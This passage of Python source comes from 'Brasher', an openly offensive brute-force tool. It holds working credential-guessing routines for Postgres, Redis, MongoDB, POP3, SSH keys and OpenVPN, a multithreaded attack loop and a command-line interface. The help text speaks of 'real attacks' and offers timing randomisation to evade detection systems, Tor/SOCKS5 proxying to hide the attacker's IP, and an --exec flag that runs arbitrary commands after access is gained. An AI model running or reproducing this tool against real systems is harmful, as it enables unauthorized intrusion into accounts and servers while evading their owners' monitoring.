            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Postgres CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.check_flags(self.postgres_connection,self.postgres_connection.close)

                
            
                
        except psycopg2.OperationalError as e:
            err = str(e).lower()

            if "password authentication failed" in err or "role" in err:  
                
                self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing postgres credentials {user}:{password}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing Postgres credentials {user}:{password}")
                
                with self.connections_lock:
                    self.total_connections += 1
                

            elif "connection refused" in err or "could not connect" in err:  


                self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to postgres server on {self.target_host}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to Postgres server on {self.target_host}")
                
                with self.connections_lock:
                    self.total_connections += 1
                

            elif "timeout" in err:  


                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"postgres connection timeout on {self.target_host}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Postgres connection timeout on {self.target_host}")

            elif "pg_hba.conf" in err: 

                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"host {self.target_host} is not allowed in pg_hba.conf"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Host {self.target_host} is not allowed in pg_hba.conf")

             
                with self.connections_lock:

                    self.total_connections += 1
                    

        except psycopg2.InternalError as e:
            
            self.safe_print(self.render_text("ERR",Back.RED,f"postgres internal error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Postgres internal error: {e}")
             
            with self.connections_lock:

                self.total_connections += 1
                    

        
        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"postgres unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Postgres unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
                




    def brute_redis(self,host : str, user : str,password : str, file: str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False

        try:      
                
                if self.stoping_event.is_set():
                    return False
                
                self.redis_connection = redis.Redis(
                    host=host,
                    port=self.port or 6379,
                    password=password.strip(),
                    socket_timeout=self.get_timeout() or 10
                )
                self.stoping_event.set()
                self.redis_connection.ping()
                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"redis password found {Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
                self.success_exit()
                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Redis PASSWORD FOUND {password}")
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Redis PASSWORD FOUND {password}")
                 
                with self.connections_lock:
                    self.total_connections += 1
               
            
        except redis.exceptions.AuthenticationError as e:

            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing redis password {password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing Redis password {password}")
            self.total_connections += 1

        except redis.exceptions.ConnectionError as e: 

            self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to redis server on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to Redis server on {self.target_host}")
            self.total_connections += 1

        except redis.exceptions.TimeoutError as e:  

            self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"redis connection timeout on {self.target_host}"))   
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Redis connection timeout on {self.target_host}")
            self.total_connections += 1

        except redis.exceptions.ResponseError as e:  


            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"redis server requires no password on {Style.BRIGHT + Fore.GREEN + self.target_host + Fore.RESET}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [WARNING] [{self.mode.upper()}] Redis server requires no password on {self.target_host}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [WARNING] [{self.mode.upper()}] Redis server requires no password on {self.target_host}")
            self.total_connections += 1


        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"redis unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Redis unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
               

        

    def brute_mongodb(self,host : str,user : str,password : str, file: str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False

        try:

            if self.stoping_event.is_set():
                    return False

            self.mongodb_connection = MongoClient(
                        host,
                        self.port or 27017,
                        username=user,
                        password=password,
                        serverSelectionTimeoutMS=(self.get_timeout() or 10) * 1000
                    )

            self.stoping_event.set()
            self.mongodb_connection.server_info()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"mongodb credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MongoDB CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MongoDB CREDENTIALS FOUND {user}:{password}")
             
            with self.connections_lock:
                self.total_connections += 1
               
            self.check_flags(self.mongodb_connection,self.mongodb_connection.close)
                
        except pymongo.errors.OperationFailure as e:

            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing mongodb credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing MongoDB credentials {user}:{password}")
              
            with self.connections_lock:
                self.total_connections += 1
               

        except pymongo.errors.ServerSelectionTimeoutError as e: 
            
            self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to mongodb server on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to MongoDB server on {self.target_host}")
              
            with self.connections_lock:
                self.total_connections += 1
               

        except pymongo.errors.ConnectionFailure as e: 

             
            with self.connections_lock:
                self.total_connections += 1
               
            self.safe_print(self.render_text("ERR",Back.RED,f"mongodb connection failure on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [ERROR] [{self.mode.upper()}] MongoDB connection failure on {self.target_host}")

        except pymongo.errors.ConfigurationError as e:  
            
            self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"mongodb configuration error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] MongoDB configuration error: {e}")
              
            with self.connections_lock:
                self.total_connections += 1
               


        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"mongodb unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] MongoDB unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
               

        


    def brute_pop3(self,host : str,user : str,password : str, file: str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False
        
        try:

            if self.stoping_event.is_set():
                    return False

            self.pop_connection = poplib.POP3(host, self.port or 110, timeout=self.get_timeout() or 10)
            self.pop_connection.user(user)
            self.pop_connection.pass_(password)
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"pop3 credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] POP3 CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] POP3 CREDENTIALS FOUND {user}:{password}")
             
            with self.connections_lock:
                self.total_connections += 1
               
            self.check_flags(self.pop_connection, self.pop_connection.quit)
                
        except poplib.error_proto as e:  
            err = str(e).lower()

            if "authentication" in err or "invalid" in err or "denied" in err:
                
                self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing pop3 credentials {user}:{password}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing pop3 credentials {user}:{password}")

            elif "locked" in err or "too many" in err:  
                
                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"pop3 account locked or too many attempts: {user}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}] [WARNING] [{self.mode.upper()}] POP3 account locked or too many attempts: {user}")

            else:  

                self.safe_print(self.render_text("ERR",Back.RED,f"pop3 protocol error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] POP3 protocol error: {e}")

            self.total_connections += 1

        except ConnectionRefusedError:  
            
            self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to pop3 server on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to POP3 server on {self.target_host}")
            self.total_connections += 1

        except socket.timeout:  
            
            self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"pop3 connection timeout on {self.target_host}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] POP3 connection timeout on {self.target_host}")
            self.total_connections += 1


    
        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"pop3 unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] POP3 unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
               





    def brute_ssh_with_keys(self,host : str,user : str,key : str, file: str) -> bool:

        try:

            if self.output_file:
                paramiko.util.log_to_file(self.output_file)

            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing SSH key: {key} with username: {user}")
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing ssh key: {key} with username: {user}"))
            
            if self.stoping_event.is_set():
                    return False
            
            self.ssh_client.connect(hostname=host,
                                            port=self.port,
                                            username=user,
                                            pkey=paramiko.pkey.PKey.from_private_key_file(key),
                                            timeout=self.get_timeout() or 30
                                            )
            
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"ssh key on username: {Style.BRIGHT + Fore.GREEN + user + Fore.RESET} found {Style.BRIGHT + Fore.GREEN + key + Fore.RESET}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH key on username: {Style.BRIGHT + Fore.GREEN + user + Style.RESET_ALL } found {Style.BRIGHT + Fore.GREEN + key + Style.RESET_ALL}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH key on username: {Style.BRIGHT + Fore.GREEN + user } found {Style.BRIGHT + Fore.GREEN + key}")
             
            with self.connections_lock:
                self.total_connections += 1
               
            self.check_flags(self.ssh_client,self.ssh_client.close)

        except paramiko.AuthenticationException as e:
             
            with self.connections_lock:
                self.total_connections += 1
               

        finally:

            if self.ssh_client:
                self.ssh_client.close()

        
    def brute_open_vpn(self,host : str,user : str,password : str, file: str):

        try:

            if not file: 

                pass



            if self.stoping_event.is_set():
                        return False


            self.open_vpn_client = OpenVPNClient(

                    config_path=file,
                    username=user,
                    password =password,
                )

            self.open_vpn_client.connect()
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing OpenVPN credentials: {user}:{password} (config: {file} )")
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing OpenVPN credentials: {user}:{password} (config: {file} )"))

            if self.open_vpn_client.is_connected():

                

                self.stoping_event.set()
                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"OpenVPN credentials found: {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET} (config: {Style.BRIGHT + Fore.GREEN + f"{file}" + Fore.RESET})"))
                self.success_exit()
                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] OPENVPN CREDENTIALS FOUND {user}:{password} (config: {file})")
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] OPENVPN CREDENTIALS FOUND {user}:{password} (config: {file})")

            self.total_connections +=1
            self.check_flags(self.open_vpn_client,self.open_vpn_client.disconnect)

        except Exception as e:

            self.safe_print(self.render_text("VPN",Back.RED,f"OpenVPN error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN ERROR] [{self.mode.upper()}] OpenVPN error: {e}")
            
        


    


    def logging(self, string) -> bool:

        if not self.output_file:  
            return False
    
        try:

            with open(self.output_file, self.log_mode or "a", encoding="utf-8") as log_file:
                log_file.write(f"{string}\n")
            return True
        
        except Exception:
            return False
        
    
   
       
    def main(self):
            
            try:
            
            
                if self.banner:

                    print(self.title)
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [BANNER] [{self.mode.upper()}] Show banner and end work")
                    time.sleep(2)
                    sys.exit(0)
                

                if self.no_banner:

                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [NO BUNNER] [{self.mode.upper()}] Skip banner")

                else:
                    print(self.title)
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [STARTING] [{self.mode.upper()}] Brasher starts")

                if self.delay == 0:

                    time.sleep(self.get_timeout())
                    

                else:

                    print(self.render_text("DEL", Style.BRIGHT + Fore.MAGENTA, f"{self.delay} second delay before starting work"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DELAY] [{self.mode.upper()}] {self.delay} second delay before starting work")
                    time.sleep(self.delay)



                if self.threads > 10:

                    self.progress_bar = False
                    print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"progress bar was disabled because it would not function correctly due to the large number of threads"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] progress bar was disabled because it would not function correctly due to the large number of threads")

                if self.no_duplicates:
                    self.remove_duplicates()

                if self.min_length_username or self.max_length_username or self.min_length_password or self.max_length_password:
                    self.sort_data()

                if self.timer:

                    self.start_timer = time.time()
                    time.sleep(self.get_timeout())


                if self.no_progress_bar:

                    self.progress_bar = False
                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"progress bar disabled"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] progress bar disabled")
                    time.sleep(self.get_timeout())


                if self.no_log:

                    self.output_file = False
                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"log was disabled"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] log was disabled")
                    time.sleep(self.get_timeout())

                self.shuffle_wordlists()      
                self.reverse_wordlists()

                if self.socks5_address and self.socks5_port:
                    print(self.render_text("INF",Style.BRIGHT + Fore.GREEN, f"socks5 proxy enabled: {self.socks5_address}:{self.socks5_port} ({self.socks5_username}:{self.socks5_password})"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] SOCKS5 proxy enabled: {self.socks5_address}:{self.socks5_port} ({self.socks5_username}:{self.socks5_password})")
                    time.sleep(self.get_timeout())

                self.connect_open_vpn()


                self.tasks = []
                for host in self.hosts:

                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"testing host: {host}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] testing host: {host}")
                

                    for file in self.open_vpn_config_file_wordlist:

                        for user in self.usernames_list:
                            for password in self.passwords_list:
                                self.tasks.append((host, user, password,file))

                print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"starting {self.threads} threads..."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] starting {self.threads} threads...")
                time.sleep(self.get_timeout())

                executor = None

                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    
                    if not self.tasks:

                        print(self.render_text("ERR", Back.RED, "no credentials to test,provide usernames/passwords or keys."))
                        sys.exit(1)

                    self.futures = [executor.submit(self.make_worker, h, u, p,f) for h, u, p,f in self.tasks]
                    
                    if self.progress_bar:
                        with tqdm(total=len(self.tasks), colour="blue", desc="Brute forcing", unit="attempt", dynamic_ncols=True) as pbar:
                            for future in as_completed(self.futures):

                                try:

                                    future.result()

                                except Exception as e:

                                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Worker Error: {e}")
                            
                                pbar.update(1)
                    else:

                        for future in as_completed(self.futures):

                            try:

                                future.result()

                            except Exception as e:

                                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Worker Error: {e}")


                
                print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,f"brasher has completed its work successfully"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Brasher has completed its work successfully")


            except KeyboardInterrupt:


                print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"brasher was terminated by the user"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] brasher was terminated by the user")
                sys.exit(0)

            except Exception as e:

                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Error: {e}")
                print(self.render_text("ERR", Back.RED, f"error: {e}"))
            
            finally:

                if self.open_vpn_connect:

                    try:

                        if self.open_vpn_client:

                            self.open_vpn_client.disconnect()
                            self.safe_print(self.render_text("VPN",Style.BRIGHT + Fore.GREEN,f"OpenVPN connection successfully terminated"))
                            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN CONNECTION] [{self.mode.upper()}] OpenVPN connection successfully terminated")


                    except Exception as e:

                        self.safe_print(self.render_text("VPN",Back.RED,f"OpenVPN error: {e}"))
                        self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN ERROR] [{self.mode.upper()}] OpenVPN error: {e}")




                if self.timer and self.start_timer is not None:

                    print(self.render_text("TIM", Fore.CYAN, f"execution time: {time.time() - self.start_timer:.2f} seconds"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TIMER] [{self.mode.upper()}] execution time: {time.time() - self.start_timer} seconds")

        
            




        
if __name__ == "__main__":


    
    
    parser = argparse.ArgumentParser(description="brasher is a brute-force tool for Python with support for over 10 protocols.")
    parser.add_argument("--host", type=str, help="Target host for attack") 
    parser.add_argument("-P", "--passwords-list", type=str, help="A list of passwords to be tried. The list should contain passwords in a column. If you only need to specify one password, create a list with only one password or use --single-password flag") 
    parser.add_argument("-U", "--usernames-list",type=str,  help="List of usernames to check. The list must contain usernames in the column. If you only need to specify one username, create a list with only one username or user --single-username flag") 
    parser.add_argument("-t", "--timeout", type=float,default=0.1,help="Timeout between connection attempts in seconds. For real attacks, it's best to set it to at least 60 seconds.The initial value is 0.1 seconds") 
    parser.add_argument("-u", "--single-username", type=str, help="This flag is used to specify the username for brute-force attacks. Knowing the username will speed up the brute-force attack.") 
    parser.add_argument("-p", "--single-password",type=str, help="This flag is used to specify the password. If you know the password but not the username, you can speed up the brute-force attack. Can be combined with the --single-username flag.") 
    parser.add_argument("-G", "--general-wordlist",type=str,  help="This flag is used to specify wordlists that store values ​​line by line in the 'username:password' format. Simply put, this flag is used to specify usernames and passwords in a single wordlist, separated by colons. If, for example, you're using brute-force attacks with SSH keys, simply specify the path to the target key file instead of the password. After specifying this flag, you don't need to specify the -P or -U flags. Important note: Brasher will load all passwords line by line, so it will take time for Brasher to load all the data.") 
    parser.add_argument("-sr", "--save-results",type=str, help="This flag is used to save successful connection attempts to a target file. Simply specify the path to the file, and Brasher will save the credentials to the file.") 
    parser.add_argument("-d", "--delay",type=float,default=0,help="Delay before starting work in seconds") 
    parser.add_argument("-shuc","--shuffle-count", type=int, default=10, help="This flag controls how many times to mix the password. By default, Brasher mixes passwords 10 times, but you can change this value using this flag. The more times you mix the passwords, the higher the entropy level will be.")
    parser.add_argument("--seed","--shuffle-seed", type=int, help="A flag is used to specify a custom seed for shuffling. Specify an integer, and shuffling will work the same way. If your integer (seed) doesn't change, the shuffling result won't change either. The flag is needed either to uniquely arrange the wordlist. Therefore, if your seed won't change, there's no point in shuffling the wordlist more than once. Use the flag only for unambiguous shuffling. If you specify an insufficiently unique number, the shuffling can be predicted. Use the flag at your own risk and only if you are absolutely certain of the uniqueness of your seed.")
    parser.add_argument("-ssf", "--shuffle-seeds-file", type=str, help="This flag is needed to specify a file in which the natural numbers used as seeds for shuffling the dictionary will be written line by line.") 
    parser.add_argument("-su","--shuffle-usernames", action="store_true", help="Shuffle usernames wordlists before starting")
    parser.add_argument("-sp","--shuffle-passwords", action="store_true", help="Shuffle passwords wordlists before starting")
    parser.add_argument("-sc","--shuffle-configs", action="store_true", help="Shuffle OpenVPN config files wordlists before starting")
    parser.add_argument("-sk","--shuffle-keys", action="store_true", help="Shuffle usernames keys before starting")
    parser.add_argument("-sh","--shuffle-hosts", action="store_true", help="Reverse the hosts wordlist order")
    parser.add_argument("-ss","--shuffle-seeds", action="store_true", help="Reverse the seeds wordlist order")
    parser.add_argument("-q","--quiet", action="store_true", help="Disables all console output. Brasher won't notify you of any messages, but this mode enables logging, and all data will be written there.")
    parser.add_argument("-b","--banner", action="store_true", help="Show banner and exit")
    parser.add_argument("-thr", "--threads", type=int,default=5,help="The number of threads to be checked. The higher the number of threads, the more noise and activity will be in the logs, and the more load you will place on your operating system. The initial value is 10 threads.") 
    parser.add_argument("-pb", "--progress-bar", action="store_true", help="Progress bar to show the process of searching and counting the number of combinations.") 
    parser.add_argument("-npb", "--no-progress-bar", action="store_true", help="Forces the progress bar to be disabled if someone changes the tool's values ​​or decides not to include it. When this flag is set, progress_bar will be set to False, and it will no longer be active.") 
    parser.add_argument("-pt", "--port", type=int, help="Specifies the port for further connections. Brute-force functions use default ports for connections; for example, SSH uses port 22. However, a service may use a non-standard port, so this flag is used to specify a specific port for testing.") 
    parser.add_argument("-mr", "--max-retries", type=int,default=None,help="This setting controls the maximum number of connection attempts to the host. Once the maximum number of connection attempts is reached, Brasher will shut down. This feature is disabled by default.") 
    parser.add_argument("-o", "--output-file",nargs="?", const="auto",help="This parameter is responsible for logging all program actions.") 
    parser.add_argument("-nl","--no-log", action="store_true", help="Forces logging to be disabled if someone changes the tool's values ​​or decides not to enable logging. When this flag is set, the output_file value will be set to False, and logging will be disabled.")
    parser.add_argument("-ko", "--keep-open",  action="store_true" ,help="This flag ensures that we don't close the connection after the first login credentials are detected. Specifying this flag will save you connection time.") 
    parser.add_argument("-e", "--exec","--execute",  type=str ,help="This flag is used to execute arbitrary commands after gaining privileges. Specify a command that Brasher will execute immediately after receiving the required data. After specifying the flag, Brasher will execute arbitrary code and exit, closing the connection and sending a response from the server. To keep the connection open after executing the code, specify the --keep-open flag.")
    parser.add_argument("-rt", "--random-timeout", type=str,default=None,help="This flag is used to specify a range of values ​​that will be selected using cryptographically strong randomness based on the entropy of your OS and used as a random timeout. This is necessary to avoid blocking detection systems. Brasher itself will not participate in random number selection, making it more difficult to predict. The value specified by this flag will be substituted for the standard --timeout flag.") 
    parser.add_argument("-ht", "--host-timeout", type=float,default=None,help="This flag controls the timeout between host tests. If you're testing more than one host, after testing one host, there will be a delay of the specified number of seconds before testing the next host.") 
    parser.add_argument("-ie", "--ignore-errors",  action="store_true" ,help="This flag is used to ignore errors. If this flag is enabled, Brasher will stop displaying any error or warning messages and continue running.") 
    parser.add_argument("-so", "--success-only",  action="store_true" ,help="This flag is used to output only successful data search attempts to the console. If you specify this flag, Brasher Force will not display any messages about testing any credentials. If you specify this flag, the program may appear to hang. However, the brute-force process will still continue.") 
    parser.add_argument("-mt", "--max-time",type=float, help="Maximum operating time") 
    parser.add_argument("-nc", "--no-color", action="store_true", help="Color output will be disabled") 
    parser.add_argument("-m", "--mode",choices=["ssh", "ftp","smb","telnet", "mysql","postgres","redis","mongodb", "pop3","ssh-key","openvpn"] , type=str , default="ssh" , help="The tool's operating mode. By default, the search mode is SSH.") 
    parser.add_argument("--log-mode", choices=["w", "a"], default="a", help="Log mode: w = overwrite, a = append") 
    parser.add_argument("-H", "--hosts-list", type=str, help="list of hosts in the file. To specify targets. Hosts should be specified in a column.") 
    parser.add_argument("--ssh-key", type=str , help="This flag is used to specify the SSH authorization key. You only need to specify the path to the key file. You must also select the ssh-key mode using the --mode flag. This flag will only use one key. For brute-force attacks, use the --keys-list flag. If you want to use a brute-force attack on keys, you don't need to specify a password list. Brasher will fill them in automatically, so you don't need to specify them. Simply specify the --ssh-key flag.")
    parser.add_argument("-kl","--keys-list", type=str , help="This flag is used to specify a file containing a list of paths to keys for SSH authentication. The flag should contain a wordlist containing file paths in a column. To enable brute-force mode using SSH keys, enable it using the mode flag. If you know the SSH key, specify only the path to the key in the dictionary or use the --ssh-key flag.If you want to use a brute-force attack, you don't need to specify a password list. Brasher will fill them in automatically, so you don't need to enter them manually. Simply specify the --keys-list flag.") 
    parser.add_argument("-nb","--no-banner", action="store_true", help="Don't show the banner")
    parser.add_argument("-s5a","--socks5-address", type=str , help="A flag for specifying a SOCKS5 proxy address that hides the real IP address. To connect, you must specify an IP address. If you want to use the TOR network as a SOCKS5 proxy, first start the TOR service itself and then specify the address 127.0.0.1.") 
    parser.add_argument("-s5p","--socks5-port", type=int , help="Parameter for specifying the SOCKS5 proxy port. If you want to use the Tor network as a proxy, first start the Tor service and then specify port 9050.") 
    parser.add_argument("-s5u","--socks5-username", type=str ,default=None, help="Flag for specifying the username for the SOCKS5 proxy. If your SOCKS5 proxy doesn't require a username (for example, when using a SOCKS5 proxy for the Tor network), do not specify this parameter.") 
    parser.add_argument("-s5pass","--socks5-password", type=str ,default=None, help="Flag for specifying a password for the SOCKS5 proxy. If your SOCKS5 proxy does not require a password (for example, when using a SOCKS5 proxy for the Tor network), do not specify this parameter.") 
    parser.add_argument("-s", "--stop-on-success", action="store_true", help="Stops the program after finding at least one login and password") 
    parser.add_argument("-time","--timer", action="store_true", help="Show execution time at the end")
    parser.add_argument("-ru","--reverse-usernames", action="store_true", help="Reverse the usernames wordlist order")
    parser.add_argument("-rp","--reverse-passwords", action="store_true", help="Reverse the passwords wordlist order")
    parser.add_argument("-rc","--reverse-configs", action="store_true", help="Reverse the OpenVPN config files wordlist order")
    parser.add_argument("-rk","--reverse-keys", action="store_true", help="Reverse the keys wordlist order")
    parser.add_argument("-rh","--reverse-hosts", action="store_true", help="Reverse the hosts wordlist order")
    parser.add_argument("-rs","--reverse-seeds", action="store_true", help="Reverse the seeds wordlist order")
    parser.add_argument("--min-length-username", type=int, help="Minimum username length to try")
    parser.add_argument("--max-length-username", type=int, help="Maximum username length to try")
